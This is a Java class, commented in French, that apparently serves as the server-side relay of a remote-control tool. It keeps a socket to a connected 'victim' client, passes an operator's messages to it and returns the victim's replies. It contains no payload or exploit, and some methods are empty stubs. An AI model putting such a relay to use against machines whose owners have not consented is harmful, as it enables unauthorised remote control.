package Modele;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

import Interfaces.Observable;
import Interfaces.ObservableUser;
import Interfaces.Observateur;


public class ConnexionVictim extends Thread implements Observable{


	private ArrayList<Observateur> listServerStart; //Liste implémentée au début mais il n'y en aura toujours qu'un seul
	private Socket socketTransitionVictim;
	private int id;
	private MessageListenner MessageListenner;
	private ObservableUser UserConnecte;
	
	private PrintWriter BufferOfWrinting;
	

	
	public ConnexionVictim(Socket soc, ServerStart s, int id) {
		this.id = id;
		this.UserConnecte = null;
		this.listServerStart = new ArrayList<Observateur>();
		this.listServerStart.add(s);
		this.socketTransitionVictim = soc;
		this.updateConnectionObservateur();
		try {
			this.BufferOfWrinting = new PrintWriter(this.socketTransitionVictim.getOutputStream());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		this.MessageListenner = new MessageListenner(this);
		this.MessageListenner.start();
		System.out.println("(serveur) : Victime connectee sur port "+this.socketTransitionVictim.getLocalPort());
	}
	
	
	public int getIdInstance() {
		return id;
	}

	public void setUserConnecte(ObservableUser userConnecte) {
		UserConnecte = userConnecte;
	}
	
	public ObservableUser getUserConnecte() {
		return UserConnecte;
	}
	
	public void run() {
		
		
			
			
			
			
			
			
		
		
	}
	
	
	public void SendMessage() {
		
	}


	@Override
	public void addObservateur(Observateur observateur) {
		this.listServerStart.add(observateur);
		
	}


	@Override
	public void delObservateur(Observateur observateur) {
		this.listServerStart.remove(observateur);
		
	}


	@Override
	public void updateConnectionObservateur() {
		for (Observateur o : this.listServerStart) {
			o.updateConnection(this);
		}
		
	}


	public void disconnect() {
		this.MessageListenner.interrupt();
		this.MessageListenner.close();
		this.close();
		this.updateDisconnectionObservateur();
	}
	
	public void close() {
		try {
			this.BufferOfWrinting.close();
		}catch(Exception e) {
		}
		try {
			this.socketTransitionVictim.close();
		}catch(Exception e) {
		}
	}
	
	
	@Override
	public void updateDisconnectionObservateur() {
		for (Observateur o : this.listServerStart) {
			o.updateDisconnection(this);
		}
		
	}
	
	public Socket getSocketTrans() {
		return this.socketTransitionVictim;
	}
	
	//méthode utilisée lors de la réception des messages provenant de la victime
	public void TraitementMesssageRecu(String message) {
		if(message == null) {
			this.disconnect();
		} else { //envoi le résultat à l'utilisateur
			
			if(UserConnecte != null && !message.isEmpty()) this.UserConnecte.envoyerMessage(message+"\n");
		}
		
	}
	
	//Sert à envoyer des messages au client victime
	public void envoyerMessage(String m){
		this.BufferOfWrinting.println(m);
		this.BufferOfWrinting.flush();
	}
	
	
}
